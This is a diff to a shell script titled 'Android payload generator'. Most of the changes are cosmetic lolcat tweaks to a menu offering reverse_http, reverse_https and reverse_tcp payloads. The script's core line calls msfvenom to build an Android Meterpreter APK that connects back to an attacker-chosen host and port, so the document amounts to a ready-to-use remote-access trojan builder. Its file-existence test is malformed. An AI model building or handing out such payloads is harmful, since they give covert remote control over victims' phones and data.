@@ -5,9 +5,9 @@ clear
 echo "######################################" |lolcat
 echo ""
 echo 'Android payload generator ' |lolcat
-echo 'Script Created by : Viliyam Vasava' |lolcat -a
+echo 'Script Created by : Viliyam Vasava' |lolcat
 echo ""
-echo 'Learn More type  easymux' |lolcat -a
+echo 'Learn More type  easymux' |lolcat
 echo ""
 echo "######################################" |lolcat
 
@@ -15,11 +15,11 @@ option=0
 
 while [ $option -ne 13 ]
 do
-	echo "*** Payload Options ***" |lolcat -a
+	echo "*** Payload Options ***" |lolcat
 	
-	echo "1. reverse_http" |lolcat
-	echo "2. reverse_https" |lolcat
-	echo "3. reverse_tcp" |lolcat
+	echo "1. reverse_http"
+	echo "2. reverse_https"
+	echo "3. reverse_tcp"
 
 	read -p "Select Payload > " option
 
@@ -53,5 +53,5 @@ echo "Generating Payload Please Wait..." |lolcat -a
 
 ~/metasploit-framework/msfvenom -p android/meterpreter/$payload LHOST=$host LPORT=$port --arch dalvik --platform android R > /sdcard/payload.apk
 
-[ d- /sdcard/payload.apk ] && echo "Payload is ready. Check it in your storage" |lolcat -a || echo "It seems somthing went wrong"
+[ f- /sdcard/payload.apk ] && echo "Payload 'payload.apk' is ready. Check it in your phone storage" |lolcat -a || echo "It seems somthing went wrong"
 
